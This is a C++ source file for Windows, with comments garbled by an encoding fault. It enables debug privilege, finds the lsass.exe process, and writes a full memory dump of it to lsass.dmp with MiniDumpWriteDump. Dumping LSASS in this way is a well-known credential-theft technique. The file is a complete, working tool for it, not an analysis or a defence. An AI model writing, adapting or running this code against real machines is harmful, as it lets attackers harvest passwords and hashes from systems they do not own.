#include <windows.h>
#include <iostream>
//  MiniDumpWriteDump��Ҫ
#include <dbghelp.h>
#include <TlHelp32.h>
#pragma comment(lib,"Dbghelp.lib")
using namespace std;
// ������Ȩ����
BOOL EnableDebugPrivilege() {
	// �������ƾ��
	HANDLE HandleToken = NULL;
	BOOL FOK = FALSE;
	// �򿪵�ǰ���̵����ƣ�����TOKEN_ADJUST_PRIVILEGESΪ���û��ֹ�����е�Ȩ�������룬HandleTokenΪ���صľ��
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &HandleToken)) {
		// ��ȡ�ɹ�֮��ִ��debugȨ������
		TOKEN_PRIVILEGES TP; //����������Ϣ�ṹ��
		TP.PrivilegeCount = 1; //����privilege��������Ŀ��
		//��������Ψһ�Ա�ʶ�����ض�LUID
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &TP.Privileges[0].Luid); //������Ȩ��ʶ����ָ������Ȩ���ƣ�����SE_DEBUG_NAME Ϊ���Ժ͵�����һ���ʻ�ӵ�еĽ��̵��ڴ������衣

		TP.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; //������Ȩ
		//���÷��ʵ���Ȩ����
		AdjustTokenPrivileges(HandleToken, FALSE, &TP, sizeof(TP), NULL, NULL);
		//��׽����ΪERROR_SUCCESS����Ȩ�����ɹ�
		FOK = (GetLastError() == ERROR_SUCCESS);
		CloseHandle(HandleToken);
	}
	return FOK;
}

int main() {
	// ����һ���ļ�������û�д��dump����������,����GENERIC_ALLΪ��ȡ���п��ܵ�Ȩ��
	HANDLE dumpFile = CreateFile(L"lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	// ����һ���ؽ��̾��
	HANDLE ProcessHandle = NULL;
	//���嵱ǰ���̵�PID
	DWORD ProcessPID = 0;
	//���嵱ǰ�Ľ�������
	LPCWSTR  ProcessName = L"";
	// �ȱ������н��̣���ѯ������Ҫdump�Ľ���PID
	HANDLE Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // ��ϵͳ�ڵ����н����������
	// ����PROCESSENTRY32�ṹ��,��������Ž��̵���Ϣ����������Ƶ�
	PROCESSENTRY32 processEntry = {};
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	// �����ȡ����һ��������Ϣ�Ļ���ִ�к������� 
	if (Process32First(Snapshot, &processEntry)) {
		//�ɹ���ȡ��һ��������Ϣ��ִ��whileѭ����֪���ҵ�Ҫdump��ָ������
		//_wcsicmp �Ƚ϶����Ƿ���ͬ�������ͬ�򷵻�0�����򷵻ش��ڻ�С��0������
		while (_wcsicmp(ProcessName, L"lsass.exe") != 0) {
			// ������һ�����̵�ȫ����Ϣ
			if (Process32Next(Snapshot, &processEntry)) {
				//�����ɹ�������true��ִ��if�ڲ���
				ProcessName = processEntry.szExeFile; // PROCESSENTRY32�ṹ�壬szExeFileΪ��������
				ProcessPID = processEntry.th32ProcessID; // PROCESSNTRY32�ṹ�壬th32ProcessIDΪ����PID
			}
			else {
				cout << "[-] Process32Next Failed !   ProcessName :" << ProcessName << endl;
			}
		}
		cout << "[+] Get Process: " << ProcessName << " PID : " << ProcessPID << endl;
	}
	//�򿪽���Ȩ�ޣ���ͲDebug
	if (EnableDebugPrivilege()) {
		// �򿪸ý��̣���ȡ�ý��̾����PROCESS_ALL_ACCESS Ϊ��ȡ���еĿ���Ȩ��
		ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, ProcessPID);
		//cout << GetLastError() << endl;
		//ִ��dump�ڴ����,MiniDumpwithFullMemoryΪdump���Ȩ�޵�����
		BOOL dump_status = MiniDumpWriteDump(ProcessHandle, ProcessPID, dumpFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
		if (dump_status) {
			cout << "[+] dump success, file name is lsass.dmp !";
		}
		else {
			cout << "[-] dump Failed !";
		}
		return 0;
		//�رս��̾��
		CloseHandle(ProcessHandle);
	}
	else {
		cout << "[-] PrivilegeToken is Failed";
	}
}